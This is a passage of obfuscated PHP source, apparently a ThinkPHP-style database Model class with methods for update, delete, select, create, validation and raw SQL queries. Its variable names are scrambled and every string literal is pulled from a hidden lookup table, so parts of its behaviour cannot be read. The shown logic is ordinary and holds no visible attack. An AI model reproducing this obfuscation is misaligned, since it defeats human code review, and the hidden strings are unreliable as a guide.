$é¢úÉ”[$»ìñØí] = $ŒÙ¡ˆû¿[$»ìñØí]; $Ö·…ğ•é[$°ş›÷¶Ú[352]] = $é¢úÉ”; unset($ŒÙ¡ˆû¿[$»ìñØí]); } else { $this->error = think_lang($°ş›÷¶Ú[351]); return !1; } } if (is_array($Ö·…ğ•é[$°ş›÷¶Ú[352]]) && isset($Ö·…ğ•é[$°ş›÷¶Ú[352]][$»ìñØí])) { $í‘±·£ = $Ö·…ğ•é[$°ş›÷¶Ú[352]][$»ìñØí]; } if (!1 === $this->_beforeUpdate($ŒÙ¡ˆû¿, $Ö·…ğ•é)) { return !1; } $îí„°¨ë = $this->db->update($ŒÙ¡ˆû¿, $Ö·…ğ•é); if (!1 !== $îí„°¨ë) { if (isset($í‘±·£)) { $ŒÙ¡ˆû¿[$»ìñØí] = $í‘±·£; } $this->_afterUpdate($ŒÙ¡ˆû¿, $Ö·…ğ•é); } return $îí„°¨ë; } protected function _beforeUpdate(&$óíÔ¥·„, $â‡Á¿­µ) { } protected function _afterUpdate($ºú²ğİË, $¯ŠÁâŸ) { } public function delete($Í®á–€’ = array()) { $ôã±êÆ· =& $_SERVER[Ş­ğŠìÒ]; if (empty($Í®á–€’) && empty($this->options[$ôã±êÆ·[352]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $°”£‚ÔÉ = $this->getPk(); if (is_numeric($Í®á–€’) || is_string($Í®á–€’)) { if (strpos($Í®á–€’, $ôã±êÆ·[50])) { $Õ«§ÓıÚ[$°”£‚ÔÉ] = array($ôã±êÆ·[353], $Í®á–€’); } else { $Õ«§ÓıÚ[$°”£‚ÔÉ] = $Í®á–€’; } $this->options[$ôã±êÆ·[352]] = $Õ«§ÓıÚ; } $Í®á–€’ = $this->_parseOptions(); if (is_array($Í®á–€’[$ôã±êÆ·[352]]) && isset($Í®á–€’[$ôã±êÆ·[352]][$°”£‚ÔÉ])) { $ö—Æ°’ = $Í®á–€’[$ôã±êÆ·[352]][$°”£‚ÔÉ]; } $Ÿ®ğñ¶‘ = $this->db->delete($Í®á–€’); if (!1 !== $Ÿ®ğñ¶‘) { $ò’¡¯’« = array(); if (isset($ö—Æ°’)) { $ò’¡¯’«[$°”£‚ÔÉ] = $ö—Æ°’; } $this->_after_delete($ò’¡¯’«, $Í®á–€’); } return $Ÿ®ğñ¶‘; } protected function _after_delete($¿úëÈÈ, $Ê¾ë¨‰ù) { } public function select($’²šùÍÏ = array()) { $ûÑ’÷¶ =& $_SERVER[Ş­ğŠìÒ]; if (is_string($’²šùÍÏ) || is_numeric($’²šùÍÏ)) { $ìªºı˜ = $this->getPk(); if (strpos($’²šùÍÏ, $ûÑ’÷¶[50])) { $òÑ«•¡[$ìªºı˜] = array($ûÑ’÷¶[353], $’²šùÍÏ); } else { $òÑ«•¡[$ìªºı˜] = $’²šùÍÏ; } $this->options[$ûÑ’÷¶[352]] = $òÑ«•¡; } elseif (!1 === $’²šùÍÏ) { $’²šùÍÏ = $this->_parseOptions(); return $ûÑ’÷¶[354] . $this->db->buildSelectSql($’²šùÍÏ) . $ûÑ’÷¶[355]; } $’²šùÍÏ = $this->_parseOptions(); $®•šöü = $this->db->select($’²šùÍÏ); if (!1 === $®•šöü) { return !1; } if (empty($®•šöü)) { return null; } $this->_afterSelect($®•šöü, $’²šùÍÏ); return $®•šöü; } protected function _afterSelect(&$¨Í«›©, $ûáìˆ­«) { } public function buildSql($•£ËÙâ¼ = array()) { $ÇèÔü£ò =& $_SERVER[Ş­ğŠìÒ]; $•£ËÙâ¼ = $this->_parseOptions($•£ËÙâ¼); return $ÇèÔü£ò[354] . $this->db->buildSelectSql($•£ËÙâ¼) . $ÇèÔü£ò[355]; } public function optionsValue($Ú°üÜŠ° = null) { if (is_null($Ú°üÜŠ°)) { return $this->options; } elseif (is_array($Ú°üÜŠ°)) { $this->options = array_merge($this->options, $Ú°üÜŠ°); } } protected function _parseOptions($ĞÏÀµâ½ = array()) { $Ù×Ùî–¢ =& $_SERVER[Ş­ğŠìÒ]; if (is_array($ĞÏÀµâ½)) { $ĞÏÀµâ½ = array_merge($this->options, $ĞÏÀµâ½); } $this->options = array(); if (!isset($ĞÏÀµâ½[$Ù×Ùî–¢[356]])) { $ĞÏÀµâ½[$Ù×Ùî–¢[356]] = $this->getTableName(); $¹³·Ç©› = $this->fields; } else { $¹³·Ç©› = $this->getDbFields(); } if (!empty($ĞÏÀµâ½[$Ù×Ùî–¢[357]])) { $ĞÏÀµâ½[$Ù×Ùî–¢[356]] .= $Ù×Ùî–¢[53] . $ĞÏÀµâ½[$Ù×Ùî–¢[357]]; } $ĞÏÀµâ½[$Ù×Ùî–¢[358]] = $this->name; if (isset($ĞÏÀµâ½[$Ù×Ùî–¢[352]]) && is_array($ĞÏÀµâ½[$Ù×Ùî–¢[352]]) && !empty($¹³·Ç©›) && !isset($ĞÏÀµâ½[$Ù×Ùî–¢[359]]) && !isset($ĞÏÀµâ½[$Ù×Ùî–¢[356]])) { foreach ($ĞÏÀµâ½[$Ù×Ùî–¢[352]] as $ËÏ ‘÷Ÿ => $å»Š) { $ËÏ ‘÷Ÿ = trim($ËÏ ‘÷Ÿ); if (in_array($ËÏ ‘÷Ÿ, $¹³·Ç©›, !0)) { if (is_scalar($å»Š)) { $this->_parseType($ĞÏÀµâ½[$Ù×Ùî–¢[352]], $ËÏ ‘÷Ÿ); } } elseif (!is_numeric($ËÏ ‘÷Ÿ) && $Ù×Ùî–¢[11] != substr($ËÏ ‘÷Ÿ, 0, 1) && !1 === strpos($ËÏ ‘÷Ÿ, $Ù×Ùî–¢[10]) && !1 === strpos($ËÏ ‘÷Ÿ, $Ù×Ùî–¢[337]) && !1 === strpos($ËÏ ‘÷Ÿ, $Ù×Ùî–¢[214]) && !1 === strpos($ËÏ ‘÷Ÿ, $Ù×Ùî–¢[360])) { unset($ĞÏÀµâ½[$Ù×Ùî–¢[352]][$ËÏ ‘÷Ÿ]); } } } $this->_options_filter($ĞÏÀµâ½); return $ĞÏÀµâ½; } protected function _options_filter(&$¬°‰ï€ï) { } protected function _parseType(&$Ñø”‰İ, $±½‡·®Í) { $Æ¨ŒÏ¼ =& $_SERVER[Ş­ğŠìÒ]; if (empty($this->options[$Æ¨ŒÏ¼[361]][$Æ¨ŒÏ¼[4] . $±½‡·®Í])) { $Óûìïõå = strtolower($this->fields[$Æ¨ŒÏ¼[329]][$±½‡·®Í]); if (!1 !== strpos($Óûìïõå, $Æ¨ŒÏ¼[362])) { } elseif (!1 === strpos($Óûìïõå, $Æ¨ŒÏ¼[363]) && !1 !== strpos($Óûìïõå, $Æ¨ŒÏ¼[364])) { $Ñø”‰İ[$±½‡·®Í] = intval($Ñø”‰İ[$±½‡·®Í]); } elseif (!1 !== strpos($Óûìïõå, $Æ¨ŒÏ¼[365]) || !1 !== strpos($Óûìïõå, $Æ¨ŒÏ¼[366])) { $Ñø”‰İ[$±½‡·®Í] = floatval($Ñø”‰İ[$±½‡·®Í]); } elseif (!1 !== strpos($Óûìïõå, $Æ¨ŒÏ¼[367])) { $Ñø”‰İ[$±½‡·®Í] = (bool) $Ñø”‰İ[$±½‡·®Í]; } } } public function find($Şñ…Â¢ = array()) { $©ç”·˜ı =& $_SERVER[Ş­ğŠìÒ]; if (is_numeric($Şñ…Â¢) || is_string($Şñ…Â¢)) { $ÖÅ™à¬ø[$this->getPk()] = intval($Şñ…Â¢); $this->options[$©ç”·˜ı[352]] = $ÖÅ™à¬ø; } $this->options[$©ç”·˜ı[368]] = 1; $Şñ…Â¢ = $this->_parseOptions(); $Šñİæ¡ú = $this->db->select($Şñ…Â¢); if (!1 === $Šñİæ¡ú) { return !1; } if (empty($Šñİæ¡ú)) { return null; } $this->data = $Šñİæ¡ú[0]; $this->_afterFind($this->data, $Şñ…Â¢); if (!empty($this->options[$©ç”·˜ı[369]])) { return $this->returnResult($this->data, $this->options[$©ç”·˜ı[369]]); } return $this->data; } protected function _afterFind(&$¼±†ñ–, $­ó¥Ä–Ù) { } protected function returnResult($ÒŠè‰ğŠ, $äšÃ¶á = '') { $Æ£û¶í =& $_SERVER[Ş­ğŠìÒ]; if ($äšÃ¶á) { if (is_callable($äšÃ¶á)) { return call_user_func($äšÃ¶á, $ÒŠè‰ğŠ); } switch (strtolower($äšÃ¶á)) { case $Æ£û¶í[370]: return json_encode($ÒŠè‰ğŠ); case $Æ£û¶í[371]: return xml_encode($ÒŠè‰ğŠ); } } return $ÒŠè‰ğŠ; } public function parseFieldsMap($¬µéäÆ¤, $®†ó¤Ò = 1) { if (!empty($this->_map)) { foreach ($this->_map as $•äê¢ÍÁ => $¦ªô…¦—) { if ($®†ó¤Ò == 1) { if (isset($¬µéäÆ¤[$¦ªô…¦—])) { $¬µéäÆ¤[$•äê¢ÍÁ] = $¬µéäÆ¤[$¦ªô…¦—]; unset($¬µéäÆ¤[$¦ªô…¦—]); } } else { if (isset($¬µéäÆ¤[$•äê¢ÍÁ])) { $¬µéäÆ¤[$¦ªô…¦—] = $¬µéäÆ¤[$•äê¢ÍÁ]; unset($¬µéäÆ¤[$•äê¢ÍÁ]); } } } } return $¬µéäÆ¤; } public function setField($´ˆü²ÓŒ, $êÇú²Á = '') { if (is_array($´ˆü²ÓŒ)) { $ô­ú¼”· = $´ˆü²ÓŒ; } else { $ô­ú¼”·[$´ˆü²ÓŒ] = $êÇú²Á; } return $this->save($ô­ú¼”·); } public function setAdd($³íœ½„¥, $ùúÈêÄ = 1) { $ÕåşØğ =& $_SERVER[Ş­ğŠìÒ]; $§ì‘™ØÂ = $³íœ½„¥ . $ÕåşØğ[372] . $ùúÈêÄ; if ($ùúÈêÄ < 0) { $§ì‘™ØÂ = $³íœ½„¥ . $ùúÈêÄ; } return $this->setField($³íœ½„¥, array($ÕåşØğ[373], $§ì‘™ØÂ)); } public function getField($§ˆ…÷, $¨¹ØáÂÛ = null) { $éïúæÊü =& $_SERVER[Ş­ğŠìÒ]; $ñ•¸ıÊı[$éïúæÊü[350]] = $§ˆ…÷; $ñ•¸ıÊı = $this->_parseOptions($ñ•¸ıÊı); $§ˆ…÷ = trim($§ˆ…÷); if (strpos($§ˆ…÷, $éïúæÊü[50])) { if (!isset($ñ•¸ıÊı[$éïúæÊü[368]])) { $ñ•¸ıÊı[$éïúæÊü[368]] = is_numeric($¨¹ØáÂÛ) ? $¨¹ØáÂÛ : $éïúæÊü[12]; } $şÎ±º‹ = $this->db->select($ñ•¸ıÊı); if (!empty($şÎ±º‹)) { $ï‰ıóóë = explode($éïúæÊü[50], $§ˆ…÷); $§ˆ…÷ = array_keys($şÎ±º‹[0]); $ÃºÃ¨” = array_shift($§ˆ…÷); $›ˆÆİºˆ = array_shift($§ˆ…÷); $‰ùŠ¢ßé = array(); $»¼Ô¡ª¹ = count($ï‰ıóóë); foreach ($şÎ±º‹ as $²ª®Ëº) { $çä™ñÔÅ = $²ª®Ëº[$ÃºÃ¨”]; if (2 == $»¼Ô¡ª¹) { $‰ùŠ¢ßé[$çä™ñÔÅ] = $²ª®Ëº[$›ˆÆİºˆ]; } else { $‰ùŠ¢ßé[$çä™ñÔÅ] = is_string($¨¹ØáÂÛ) ? implode($¨¹ØáÂÛ, $²ª®Ëº) : $²ª®Ëº; } } return $‰ùŠ¢ßé; } } else { if (!0 !== $¨¹ØáÂÛ) { $ñ•¸ıÊı[$éïúæÊü[368]] = is_numeric($¨¹ØáÂÛ) ? $¨¹ØáÂÛ : 1; } if ($¨¹ØáÂÛ === $éïúæÊü[332]) { unset($ñ•¸ıÊı[$éïúæÊü[368]]); } $²ª®Ëº = $this->db->select($ñ•¸ıÊı); if (!empty($²ª®Ëº)) { if ($¨¹ØáÂÛ === $éïúæÊü[332]) { return reset($²ª®Ëº[0]); } if (!0 !== $¨¹ØáÂÛ && 1 == $ñ•¸ıÊı[$éïúæÊü[368]]) { return reset($²ª®Ëº[0]); } foreach ($²ª®Ëº as $¨ùƒ§) { $ÇäßÙı„[] = $¨ùƒ§[$§ˆ…÷]; } return $ÇäßÙı„; } } return null; } public function create($ÀˆÆÌ¶ì = '', $Ï‡úéù = '') { $¯Æß™‰Œ =& $_SERVER[Ş­ğŠìÒ]; if (empty($ÀˆÆÌ¶ì)) { $ÀˆÆÌ¶ì = $_POST; } elseif (is_object($ÀˆÆÌ¶ì)) { $ÀˆÆÌ¶ì = get_object_vars($ÀˆÆÌ¶ì); } if (empty($ÀˆÆÌ¶ì) || !is_array($ÀˆÆÌ¶ì)) { $this->error = think_lang($¯Æß™‰Œ[348]); return !1; } $ÀˆÆÌ¶ì = $this->parseFieldsMap($ÀˆÆÌ¶ì, 0); $Ï‡úéù = $Ï‡úéù ? $Ï‡úéù : (!empty($ÀˆÆÌ¶ì[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$¯Æß™‰Œ[350]])) { $ÒıÑ´•„ = $this->options[$¯Æß™‰Œ[350]]; unset($this->options[$¯Æß™‰Œ[350]]); } elseif ($Ï‡úéù == THINK_MODEL_INSERT && isset($this->insertFields)) { $ÒıÑ´•„ = $this->insertFields; } elseif ($Ï‡úéù == THINK_MODEL_UPDATE && isset($this->updateFields)) { $ÒıÑ´•„ = $this->updateFields; } if (isset($ÒıÑ´•„)) { if (is_string($ÒıÑ´•„)) { $ÒıÑ´•„ = explode($¯Æß™‰Œ[50], $ÒıÑ´•„); } if (think_config($¯Æß™‰Œ[374])) { $ÒıÑ´•„[] = think_config($¯Æß™‰Œ[375]); } foreach ($ÀˆÆÌ¶ì as $ÆÀÑ©´§ => $•ÂÎâ÷°) { if (!in_array($ÆÀÑ©´§, $ÒıÑ´•„)) { unset($ÀˆÆÌ¶ì[$ÆÀÑ©´§]); } } } if (!$this->autoValidation($ÀˆÆÌ¶ì, $Ï‡úéù)) { return !1; } if (!$this->autoCheckToken($ÀˆÆÌ¶ì)) { $this->error = think_lang($¯Æß™‰Œ[376]); return !1; } if ($this->autoCheckFields) { $ÒıÑ´•„ = $this->getDbFields(); foreach ($ÀˆÆÌ¶ì as $ÆÀÑ©´§ => $•ÂÎâ÷°) { if (!in_array($ÆÀÑ©´§, $ÒıÑ´•„)) { unset($ÀˆÆÌ¶ì[$ÆÀÑ©´§]); } elseif (MAGIC_QUOTES_GPC && is_string($•ÂÎâ÷°)) { $ÀˆÆÌ¶ì[$ÆÀÑ©´§] = stripslashes($•ÂÎâ÷°); } } } $this->autoOperation($ÀˆÆÌ¶ì, $Ï‡úéù); $this->data = $ÀˆÆÌ¶ì; return $ÀˆÆÌ¶ì; } public function autoCheckToken($¿ÛÖ™“¸) { $óú¹¼Œ =& $_SERVER[Ş­ğŠìÒ]; if (isset($this->options[$óú¹¼Œ[377]]) && !$this->options[$óú¹¼Œ[377]]) { return !0; } if (think_config($óú¹¼Œ[374])) { $¢û¢¼Á = think_config($óú¹¼Œ[375]); if (!isset($¿ÛÖ™“¸[$¢û¢¼Á]) || Session::get($¢û¢¼Á)) { return !1; } list($Ø§´Ö…, $áçŞ¨ç²) = explode($óú¹¼Œ[11], $¿ÛÖ™“¸[$¢û¢¼Á]); if ($áçŞ¨ç² && Session::get($¢û¢¼Á . $óú¹¼Œ[10] . $Ø§´Ö…) === $áçŞ¨ç²) { Session::remove($¢û¢¼Á . $óú¹¼Œ[10] . $Ø§´Ö…); return !0; } if (think_config($óú¹¼Œ[378])) { Session::remove($¢û¢¼Á . $óú¹¼Œ[10] . $Ø§´Ö…); } return !1; } return !0; } public function regex($‚ñîÛ¢, $±ó¢âÇã) { $“×‘ÏñŠ =& $_SERVER[Ş­ğŠìÒ]; $²ôŠø†Š = array($“×‘ÏñŠ[379] => $“×‘ÏñŠ[380], $“×‘ÏñŠ[381] => $“×‘ÏñŠ[382], $“×‘ÏñŠ[383] => $“×‘ÏñŠ[384], $“×‘ÏñŠ[385] => $“×‘ÏñŠ[386], $“×‘ÏñŠ[387] => $“×‘ÏñŠ[388], $“×‘ÏñŠ[389] => $“×‘ÏñŠ[390], $“×‘ÏñŠ[391] => $“×‘ÏñŠ[392], $“×‘ÏñŠ[366] => $“×‘ÏñŠ[393], $“×‘ÏñŠ[394] => $“×‘ÏñŠ[395]); if (isset($²ôŠø†Š[strtolower($±ó¢âÇã)])) { $±ó¢âÇã = $²ôŠø†Š[strtolower($±ó¢âÇã)]; } return preg_match($±ó¢âÇã, $‚ñîÛ¢) === 1; } private function autoOperation(&$¬´…ƒ…Â, $Ÿ¬Çâ£å) { $ÍáĞ¸ÑÜ =& $_SERVER[Ş­ğŠìÒ]; if (!empty($this->options[$ÍáĞ¸ÑÜ[396]])) { $óïëÜÖú = $this->options[$ÍáĞ¸ÑÜ[396]]; unset($this->options[$ÍáĞ¸ÑÜ[396]]); } elseif (!empty($this->_auto)) { $óïëÜÖú = $this->_auto; } if (isset($óïëÜÖú)) { foreach ($óïëÜÖú as $æ­¤•Ñ†) { if (empty($æ­¤•Ñ†[2])) { $æ­¤•Ñ†[2] = THINK_MODEL_INSERT; } if ($Ÿ¬Çâ£å == $æ­¤•Ñ†[2] || $æ­¤•Ñ†[2] == THINK_MODEL_BOTH) { switch (trim($æ­¤•Ñ†[3])) { case $ÍáĞ¸ÑÜ[397]: case $ÍáĞ¸ÑÜ[398]: $²ï‚Ş  = isset($æ­¤•Ñ†[4]) ? (array) $æ­¤•Ñ†[4] : array(); if (isset($¬´…ƒ…Â[$æ­¤•Ñ†[0]])) { array_unshift($²ï‚Ş , $¬´…ƒ…Â[$æ­¤•Ñ†[0]]); } if ($ÍáĞ¸ÑÜ[397] == $æ­¤•Ñ†[3]) { $¬´…ƒ…Â[$æ­¤•Ñ†[0]] = call_user_func_array($æ­¤•Ñ†[1], $²ï‚Ş ); } else { $¬´…ƒ…Â[$æ­¤•Ñ†[0]] = call_user_func_array(array(&$this, $æ­¤•Ñ†[1]), $²ï‚Ş ); } break; case $ÍáĞ¸ÑÜ[350]: $¬´…ƒ…Â[$æ­¤•Ñ†[0]] = $¬´…ƒ…Â[$æ­¤•Ñ†[1]]; break; case $ÍáĞ¸ÑÜ[399]: if ($ÍáĞ¸ÑÜ[12] === $¬´…ƒ…Â[$æ­¤•Ñ†[0]]) { unset($¬´…ƒ…Â[$æ­¤•Ñ†[0]]); } break; case $ÍáĞ¸ÑÜ[400]: default: $¬´…ƒ…Â[$æ­¤•Ñ†[0]] = $æ­¤•Ñ†[1]; } if (!1 === $¬´…ƒ…Â[$æ­¤•Ñ†[0]]) { unset($¬´…ƒ…Â[$æ­¤•Ñ†[0]]); } } } } return $¬´…ƒ…Â; } protected function autoValidation($ÅÃùØ÷, $Ö÷šê) { $‡ÓÛß¢ =& $_SERVER[Ş­ğŠìÒ]; if (!empty($this->options[$‡ÓÛß¢[401]])) { $”Æ‹Îâ¦ = $this->options[$‡ÓÛß¢[401]]; unset($this->options[$‡ÓÛß¢[401]]); } elseif (!empty($this->_validate)) { $”Æ‹Îâ¦ = $this->_validate; } if (isset($”Æ‹Îâ¦)) { if ($this->patchValidate) { $this->error = array(); } foreach ($”Æ‹Îâ¦ as $±±¨º³ => $×ùÎŞ®³) { if (empty($×ùÎŞ®³[5]) || $×ùÎŞ®³[5] == THINK_MODEL_BOTH || $×ùÎŞ®³[5] == $Ö÷šê) { if (0 == strpos($×ùÎŞ®³[2], $‡ÓÛß¢[402]) && strpos($×ùÎŞ®³[2], $‡ÓÛß¢[403])) { $×ùÎŞ®³[2] = think_lang(substr($×ùÎŞ®³[2], 2, -1)); } $×ùÎŞ®³[3] = isset($×ùÎŞ®³[3]) ? $×ùÎŞ®³[3] : THINK_EXISTS_VALIDATE; $×ùÎŞ®³[4] = isset($×ùÎŞ®³[4]) ? $×ùÎŞ®³[4] : $‡ÓÛß¢[404]; switch ($×ùÎŞ®³[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($ÅÃùØ÷, $×ùÎŞ®³)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($‡ÓÛß¢[12] != trim($ÅÃùØ÷[$×ùÎŞ®³[0]])) { if (!1 === $this->_validationField($ÅÃùØ÷, $×ùÎŞ®³)) { return !1; } } break; default: if (isset($ÅÃùØ÷[$×ùÎŞ®³[0]])) { if (!1 === $this->_validationField($ÅÃùØ÷, $×ùÎŞ®³)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($™´ÖîÅ¯, $¬ŸçÅ¬·) { if (!1 === $this->_validationFieldItem($™´ÖîÅ¯, $¬ŸçÅ¬·)) { if ($this->patchValidate) { $this->error[$¬ŸçÅ¬·[0]] = $¬ŸçÅ¬·[2]; } else { $this->error = $¬ŸçÅ¬·[2]; return !1; } } return; } protected function _validationFieldItem($˜åÉŒ°‘, $Ó­çíü•) { $ß³ï£ =& $_SERVER[Ş­ğŠìÒ]; switch (strtolower(trim($Ó­çíü•[4]))) { case $ß³ï£[397]: case $ß³ï£[398]: $ô•²İæ = isset($Ó­çíü•[6]) ? (array) $Ó­çíü•[6] : array(); if (is_string($Ó­çíü•[0]) && strpos($Ó­çíü•[0], $ß³ï£[50])) { $Ó­çíü•[0] = explode($ß³ï£[50], $Ó­çíü•[0]); } if (is_array($Ó­çíü•[0])) { foreach ($Ó­çíü•[0] as $˜„Ã²á¤) { $‰´÷²½Ñ[$˜„Ã²á¤] = $˜åÉŒ°‘[$˜„Ã²á¤]; } array_unshift($ô•²İæ, $‰´÷²½Ñ); } else { array_unshift($ô•²İæ, $˜åÉŒ°‘[$Ó­çíü•[0]]); } if ($ß³ï£[397] == $Ó­çíü•[4]) { return call_user_func_array($Ó­çíü•[1], $ô•²İæ); } else { return call_user_func_array(array(&$this, $Ó­çíü•[1]), $ô•²İæ); } case $ß³ï£[405]: return $˜åÉŒ°‘[$Ó­çíü•[0]] == $˜åÉŒ°‘[$Ó­çíü•[1]]; case $ß³ï£[406]: if (is_string($Ó­çíü•[0]) && strpos($Ó­çíü•[0], $ß³ï£[50])) { $Ó­çíü•[0] = explode($ß³ï£[50], $Ó­çíü•[0]); } $â¯¾Šö = array(); if (is_array($Ó­çíü•[0])) { foreach ($Ó­çíü•[0] as $˜„Ã²á¤) { $â¯¾Šö[$˜„Ã²á¤] = $˜åÉŒ°‘[$˜„Ã²á¤]; } } else { $â¯¾Šö[$Ó­çíü•[0]] = $˜åÉŒ°‘[$Ó­çíü•[0]]; } if (!empty($˜åÉŒ°‘[$this->getPk()])) { $â¯¾Šö[$this->getPk()] = array($ß³ï£[407], $˜åÉŒ°‘[$this->getPk()]); } if ($this->where($â¯¾Šö)->find()) { return !1; } return !0; default: return $this->check($˜åÉŒ°‘[$Ó­çíü•[0]], $Ó­çíü•[1], $Ó­çíü•[4]); } } public function check($Ëšƒà»ë, $²”Œ‡Ü, $À°¾Š×› = "\x72\x65\147\145\x78") { $çœùÁ¢Ù =& $_SERVER[Ş­ğŠìÒ]; $À°¾Š×› = strtolower(trim($À°¾Š×›)); switch ($À°¾Š×›) { case $çœùÁ¢Ù[7]: case $çœùÁ¢Ù[408]: $­¦Úºõ± = is_array($²”Œ‡Ü) ? $²”Œ‡Ü : explode($çœùÁ¢Ù[50], $²”Œ‡Ü); return $À°¾Š×› == $çœùÁ¢Ù[7] ? in_array($Ëšƒà»ë, $­¦Úºõ±) : !in_array($Ëšƒà»ë, $­¦Úºõ±); case $çœùÁ¢Ù[409]: case $çœùÁ¢Ù[410]: if (is_array($²”Œ‡Ü)) { $´¶ª¡„ = $²”Œ‡Ü[0]; $ÀİÚ”û‡ = $²”Œ‡Ü[1]; } else { list($´¶ª¡„, $ÀİÚ”û‡) = explode($çœùÁ¢Ù[50], $²”Œ‡Ü); } return $À°¾Š×› == $çœùÁ¢Ù[409] ? $Ëšƒà»ë >= $´¶ª¡„ && $Ëšƒà»ë <= $ÀİÚ”û‡ : $Ëšƒà»ë < $´¶ª¡„ || $Ëšƒà»ë > $ÀİÚ”û‡; case $çœùÁ¢Ù[411]: case $çœùÁ¢Ù[412]: return $À°¾Š×› == $çœùÁ¢Ù[411] ? $Ëšƒà»ë == $²”Œ‡Ü : $Ëšƒà»ë != $²”Œ‡Ü; case $çœùÁ¢Ù[413]: $Æ¿´òê = mb_strlen($Ëšƒà»ë, $çœùÁ¢Ù[414]); if (strpos($²”Œ‡Ü, $çœùÁ¢Ù[50])) { list($´¶ª¡„, $ÀİÚ”û‡) = explode($çœùÁ¢Ù[50], $²”Œ‡Ü); return $Æ¿´òê >= $´¶ª¡„ && $Æ¿´òê <= $ÀİÚ”û‡; } else { return $Æ¿´òê == $²”Œ‡Ü; } case $çœùÁ¢Ù[415]: list($¤–¥£Ğè, $È‚Å„¹Ï) = explode($çœùÁ¢Ù[50], $²”Œ‡Ü); if (!is_numeric($¤–¥£Ğè)) { $¤–¥£Ğè = strtotime($¤–¥£Ğè); } if (!is_numeric($È‚Å„¹Ï)) { $È‚Å„¹Ï = strtotime($È‚Å„¹Ï); } return NOW_TIME >= $¤–¥£Ğè && NOW_TIME <= $È‚Å„¹Ï; case $çœùÁ¢Ù[416]: return in_array(get_client_ip(), explode($çœùÁ¢Ù[50], $²”Œ‡Ü)); case $çœùÁ¢Ù[417]: return !in_array(get_client_ip(), explode($çœùÁ¢Ù[50], $²”Œ‡Ü)); case $çœùÁ¢Ù[404]: default: return $this->regex($Ëšƒà»ë, $²”Œ‡Ü); } } public function query($¨ó…€, $¶ÍíÙ‡Ñ = false) { $îà¥‹Ì =& $_SERVER[Ş­ğŠìÒ]; if (!is_bool($¶ÍíÙ‡Ñ) && !is_array($¶ÍíÙ‡Ñ)) { $¶ÍíÙ‡Ñ = func_get_args(); array_shift($¶ÍíÙ‡Ñ); } $¨ó…€ = str_replace(array($îà¥‹Ì[262], $îà¥‹Ì[418]), $îà¥‹Ì[53], $¨ó…€); $¨ó…€ = $this->parseSql($¨ó…€, $¶ÍíÙ‡Ñ); return $this->db->query($¨ó…€); } public function execute($¯Èğê‘Ş, $ö–¾°¡¾ = false) { if (!is_bool($ö–¾°¡¾) && !is_array($ö–¾°¡¾)) { $ö–¾°¡¾ = func_get_args(); array_shift($ö–¾°¡¾); } $¯Èğê‘Ş = $this->parseSql($¯Èğê‘Ş, $ö–¾°¡¾); return $this->db->execute($¯Èğê‘Ş); } protected function parseSql($¬ñß¡µÙ, $íÉ‘ß¶¿) { $¦ªç©ìÍ =& $_SERVER[Ş­ğŠìÒ]; if (!0 === $íÉ‘ß¶¿) { $£³Â‹çê = $this->_parseOptions(); $¬ñß¡µÙ = $this->db->parseSql($¬ñß¡µÙ, $£³Â‹çê); } elseif (is_array($íÉ‘ß¶¿)) { $íÉ‘ß¶¿ = array_map(array($this->db, $¦ªç©ìÍ[419]), $íÉ‘ß¶¿); $¬ñß¡µÙ = vsprintf($¬ñß¡µÙ, $íÉ‘ß¶¿); } else { $¬ñß¡µÙ = strtr($¬ñß¡µÙ, array($¦ªç©ìÍ[420] => $this->getTableName(), $¦ªç©ìÍ[421] => think_config($¦ªç©ìÍ[321]))); } $this->db->setModel($this->name); return $¬ñß¡µÙ; } public function db($¿Îõ¼–ˆ = '', $ßÀ¾å®ï = '', $˜ûğ—ş = array()) { $Ÿ÷Ãòí¹ =& $_SERVER[Ş­ğŠìÒ]; if ($Ÿ÷Ãòí¹[12] === $¿Îõ¼–ˆ && $this->db) { return $this->db; } static $ÑğÀ¾† = array(); static $²ÏÆš‘ = array(); if (!isset($²ÏÆš‘[$¿Îõ¼–ˆ]) || isset($²ÏÆš‘[$¿Îõ¼–ˆ]) && $ßÀ¾å®ï && $ÑğÀ¾†[$¿Îõ¼–ˆ] != $ßÀ¾å®ï) { if (!empty($ßÀ¾å®ï) && is_string($ßÀ¾å®ï) && !1 === strpos($ßÀ¾å®ï, $Ÿ÷Ãòí¹[8])) { $ßÀ¾å®ï = think_config($ßÀ¾å®ï); } $¿Îõ¼–ˆ = think_guid($ßÀ¾å®ï); $²ÏÆš‘[$¿Îõ¼–ˆ] = Db::getInstance($ßÀ¾å®ï); } elseif (NULL === $ßÀ¾å®ï) { $²ÏÆš‘[$¿Îõ¼–ˆ]->close(); unset($²ÏÆš‘[$¿Îõ¼–ˆ]); return; } if (!empty($˜ûğ—ş)) { if (is_string($˜ûğ—ş)) { parse_str($˜ûğ—ş, $˜ûğ—ş); } foreach ($˜ûğ—ş as $ÂÈş¹¶Ó => $¬œöìœï) { $this->setProperty($ÂÈş¹¶Ó, $¬œöìœï); } } $ÑğÀ¾†[$¿Îõ¼–ˆ] = $ßÀ¾å®ï; $this->db = $²ÏÆš‘[$¿Îõ¼–ˆ]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $ò“ÍûŒİ = get_class($this); if ($ò“ÍûŒİ == $_SERVER[Ş­ğŠìÒ][422]) { return $this->name; } $this->name = substr($ò“ÍûŒİ, 0, -5); } return $this->name; } public function getTableName() { $½¤”ÖÇû =& $_SERVER[Ş­ğŠìÒ]; if (empty($this->trueTableName)) { $˜äë¯©Æ = !empty($this->tablePrefix) ? $this->tablePrefix : $½¤”ÖÇû[12]; if (!empty($this->tableName)) { $˜äë¯©Æ .= $this->tableName; } else { $˜äë¯©Æ .= think_parse_name($this->name); } $this->trueTableName = strtolower($˜äë¯©Æ); } return (!empty($this->dbName) ? $this->dbName . $½¤”ÖÇû[10] : $½¤”ÖÇû[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return 